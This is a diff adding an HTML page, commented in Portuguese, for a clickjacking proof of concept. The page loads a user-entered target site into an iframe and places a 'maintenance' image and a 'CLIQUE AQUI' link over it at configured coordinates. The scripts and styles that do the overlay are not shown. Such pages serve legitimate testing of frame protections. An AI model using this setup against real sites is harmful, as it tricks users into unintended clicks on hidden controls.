@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>💣 Clickjacking PoC</title>
+
+  <link rel="stylesheet" href="poc.css" />
+</head>
+
+<body>
+
+  <!-- Painel para informar o alvo -->
+  <div id="controlPanel">
+
+    <input
+      id="targetUrl"
+      type="url"
+      placeholder="https://site-alvo.com.br/"
+    />
+
+    <button id="loadTarget">
+      Carregar
+    </button>
+
+    <span id="targetStatus"></span>
+
+    <span id="targetDisplay"></span>
+
+  </div>
+
+  <!-- Site alvo -->
+  <iframe
+    id="targetFrame"
+    src="about:blank">
+  </iframe>
+
+  <!-- Imagem da PoC -->
+  <img
+    id="pocImage"
+    src="assets/manutencao.jpg"
+    alt="Imagem da PoC"
+  />
+
+  <!-- Elemento interativo sobreposto -->
+  <a
+    id="redirectLink"
+    href="https://example.com/"
+    target="_blank"
+  >
+    CLIQUE AQUI
+  </a>
+
+  <script>
+    window.POC_CONFIG = {
+
+      // Resolução usada para calcular as coordenadas
+      baseWidth: 1920,
+      baseHeight: 1080,
+
+      // Ponto correspondente ao alvo
+      targetX: 960,
+      targetY: 580,
+
+      // Ajuste fino do link
+      linkOffsetX: -80,
+      linkOffsetY: -20
+    };
+  </script>
+
+  <script src="poc.js"></script>
+
+</body>
+</html>
